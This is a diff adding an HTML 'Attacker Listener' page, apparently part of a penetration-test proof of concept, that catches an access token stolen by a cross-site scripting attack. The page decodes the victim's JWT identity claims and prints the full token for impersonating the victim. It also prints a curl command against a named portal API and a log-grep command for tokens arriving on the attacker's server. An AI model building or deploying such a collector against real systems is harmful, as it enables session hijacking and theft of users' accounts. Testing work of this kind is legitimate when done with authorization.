@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attacker Listener — Waiting for stolen token</title>
+    <style>
+        body { font-family: monospace; margin: 2em; background: #1a1a1a; color: #0f0; }
+        pre { background: #000; padding: 1em; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        h1 { color: #f90; }
+        .waiting { color: #aaa; }
+        .success { color: #0f0; }
+    </style>
+</head>
+<body>
+    <h1>Attacker Listener</h1>
+    <p>Keep this page open. When the victim clicks the link, the stolen token will appear below.</p>
+    <pre id="output" class="waiting">Waiting for victim to click the link...</pre>
+
+    <script>
+    var params = new URLSearchParams(location.search);
+    var token = params.get('token');
+    var output = document.getElementById('output');
+
+    if (token) {
+        output.className = 'success';
+        output.textContent = '[+] TOKEN RECEIVED FROM VICTIM\n';
+        output.textContent += '[+] Timestamp: ' + new Date().toISOString() + '\n\n';
+        output.textContent += '[+] Access token (first 100 chars):\n';
+        output.textContent += token.substring(0, 100) + '...\n\n';
+
+        try {
+            var b64 = token.split('.')[1];
+            b64 += '=='.substring(0, (4 - b64.length % 4) % 4);
+            var claims = JSON.parse(atob(b64));
+            output.textContent += '[+] VICTIM IDENTITY:\n';
+            output.textContent += '    Name:     ' + claims.name + '\n';
+            output.textContent += '    Email:    ' + claims.email + '\n';
+            output.textContent += '    Sub:      ' + claims.sub + '\n';
+            output.textContent += '    Scope:    ' + claims.scope + '\n';
+            output.textContent += '    Issuer:   ' + claims.iss + '\n';
+            output.textContent += '    Expires:  ' + new Date(claims.exp * 1000).toISOString() + '\n\n';
+        } catch(e) {
+            output.textContent += '[!] Could not decode JWT: ' + e.message + '\n\n';
+        }
+
+        output.textContent += '[+] FULL TOKEN (copy this to use the API as the victim):\n\n';
+        output.textContent += token + '\n\n';
+        output.textContent += '[!] To prove access, run:\n';
+        output.textContent += 'curl -H "Authorization: Bearer ' + token.substring(0, 40) + '..." \\\n';
+        output.textContent += '  https://lic.pt.2c8.com/portal/api/v2/me\n';
+    } else {
+        // Poll for token arrival by reloading
+        // In a real attack this would be a WebSocket or server-side listener
+        output.textContent += '\nThis page shows the token when the victim clicks the link.\n';
+        output.textContent += 'The token arrives as ?token=... in the URL.\n';
+        output.textContent += '\nIf you are the attacker, just wait — the page will load\n';
+        output.textContent += 'with the token when the XSS fires on the victim\'s browser.\n';
+        output.textContent += '\nNote: The token arrives as a request to this URL in your\n';
+        output.textContent += 'web server access logs, even if this page is not open.\n';
+        output.textContent += 'Check: tail -f /var/log/nginx/access.log | grep token\n';
+    }
+    </script>
+</body>
+</html>
